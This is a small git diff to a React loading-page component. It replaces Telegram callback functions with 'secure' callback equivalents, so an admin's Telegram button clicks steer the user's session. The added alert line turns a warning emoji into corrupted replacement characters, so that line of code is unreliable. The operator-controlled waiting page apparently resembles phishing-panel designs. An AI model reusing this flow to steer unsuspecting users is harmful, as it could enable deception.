@@ -3,9 +3,9 @@ import { useLocation, useNavigate } from "react-router-dom";
 import { Loader2 } from "lucide-react";
 import { getSession, showAdminButtons } from "@/lib/telegram-service-enhanced";
 import {
-  registerTelegramCallback,
-  unregisterTelegramCallback,
-} from "@/lib/telegram-callback-service";
+  registerSecureCallback,
+  unregisterSecureCallback,
+} from "@/lib/callback-session-fix";
 import { useRealtimePresence } from "@/hooks/useRealtimePresence";
 
 const Loading = () => {
@@ -38,7 +38,7 @@ const Loading = () => {
         setSessionData(session);
 
         // Register callback handler for admin button clicks
-        registerTelegramCallback(sessionId, (action) => {
+        registerSecureCallback(sessionId, (action) => {
           console.log("🎯 Admin clicked:", action);
           handleAdminAction(action);
         });
@@ -66,7 +66,7 @@ const Loading = () => {
     // Cleanup callback registration when component unmounts
     return () => {
       if (sessionId) {
-        unregisterTelegramCallback(sessionId);
+        unregisterSecureCallback(sessionId);
       }
     };
   }, [sessionId, navigate]);
@@ -152,7 +152,7 @@ const Loading = () => {
         break;
       default:
         console.error("Unknown admin action:", action);
-        alert(`⚠️ عملیات ناشناخته: ${action}`);
+        alert(`⚠�� عملیات ناشناخته: ${action}`);
     }
   };
 
